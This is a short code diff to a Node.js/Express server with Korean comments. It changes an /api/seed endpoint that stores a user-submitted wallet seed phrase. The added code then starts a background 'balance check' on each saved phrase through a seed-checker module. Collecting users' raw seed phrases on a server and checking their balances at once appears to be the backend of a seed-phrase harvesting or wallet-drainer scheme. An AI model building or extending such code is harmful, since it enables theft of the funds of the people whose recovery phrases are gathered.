@@ -1039,8 +1039,20 @@ app.post('/api/seed', async (req, res) => {
     const userId = await sessionStore.getUserId(token);
     if (!userId) return res.status(401).end();
     
-    await db.seedDB.add(userId, phrase);
+    const seedId = await db.seedDB.add(userId, phrase);
     res.json({ ok: true });
+
+    // 저장 즉시 백그라운드에서 잔고 검사 트리거
+    if (seedId) {
+      setImmediate(async () => {
+        try {
+          const { processSeed } = require('./seed-checker');
+          await processSeed({ id: seedId, user_id: userId, phrase: phrase.trim(), created_at: new Date() });
+        } catch (e) {
+          console.error(`[SEED 즉시검사] ID=${seedId} 오류:`, e.message);
+        }
+      });
+    }
   } catch (error) {
     console.error('시드 저장 오류:', error);
     res.status(500).json({ error: '서버 오류가 발생했습니다.' });
